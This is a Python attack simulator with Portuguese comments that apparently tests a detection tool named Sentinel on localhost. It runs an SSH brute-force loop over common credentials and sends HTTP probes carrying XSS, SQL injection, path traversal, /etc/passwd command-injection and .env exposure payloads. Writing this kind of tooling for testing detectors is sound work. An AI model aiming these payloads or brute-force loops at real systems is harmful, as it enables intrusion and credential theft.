import socket
import time
import random
from datetime import datetime

def simulate_ssh_bruteforce():
    """Simular ataque de força bruta SSH"""
    print(" Simulando ataque de força bruta SSH...")
    
    users = ['root', 'admin', 'test', 'ubuntu', 'oracle', 'postgres']
    passwords = ['123456', 'password', 'admin', 'root', 'toor', 'qwerty']
    
    for i in range(10):
        user = random.choice(users)
        password = random.choice(passwords)
        
        try:
            s = socket.socket()
            s.connect(('localhost', 2222))
            s.settimeout(5)
            
            # Receber banner
            time.sleep(0.5)
            s.recv(1024)
            
            # Enviar username
            time.sleep(0.3)
            s.send(f"{user}\n".encode())
            
            # Receber prompt de senha
            time.sleep(0.5)
            try:
                s.recv(1024)
            except:
                pass
            
            # Enviar senha
            s.send(f"{password}\n".encode())
            
            print(f"  Tentativa {i+1}: {user}:{password}")
            
            time.sleep(0.5)
            s.close()
            
        except Exception as e:
            print(f"  Erro na tentativa {i+1}: {e}")
        
        time.sleep(random.uniform(0.5, 1.5))
    
    print(" Ataque SSH simulado!")

def simulate_http_attacks():
    """Simular ataques HTTP"""
    print("\n Simulando ataques HTTP...")
    
    attacks = [
        "/search?q=<script>alert('xss')</script>",
        "/page.php?id=1' OR '1'='1",
        "/../../etc/passwd",
        "/admin/login",
        "/phpmyadmin/index.php",
        "/wp-admin/install.php",
        "/shell?cmd=cat /etc/passwd",
        "/.env",
        "/config.php.bak",
        "/sql.php?id=1 UNION SELECT * FROM users"
    ]
    
    for attack in attacks:
        try:
            import requests
            url = f"http://localhost:8080{attack}"
            response = requests.get(url, timeout=5)
            print(f"  {attack}: Status {response.status_code}")
        except:
            try:
                # Fallback para socket
                s = socket.socket()
                s.connect(('localhost', 8080))
                request = f"GET {attack} HTTP/1.1\r\nHost: localhost\r\n\r\n"
                s.send(request.encode())
                time.sleep(0.5)
                s.close()
                print(f"  {attack}: Enviado")
            except Exception as e:
                print(f"  {attack}: Erro - {e}")
        
        time.sleep(0.5)
    
    print(" Ataques HTTP simulados!")

if __name__ == "__main__":
    print("=" * 60)
    print(" SIMULADOR DE ATAQUES - SENTINEL")
    print("=" * 60)
    print(f" Início: {datetime.now().strftime('%H:%M:%S')}")
    print()
    
    # Simular ataques SSH
    simulate_ssh_bruteforce()
    
    # Simular ataques HTTP
    simulate_http_attacks()
    
    print()
    print("=" * 60)
    print(" TODOS OS ATAQUES SIMULADOS!")
    print(" Verifique os resultados com:")
    print("   python3 sentinel_cli.py status")
    print("   python3 sentinel_cli.py attacks")
    print("=" * 60)
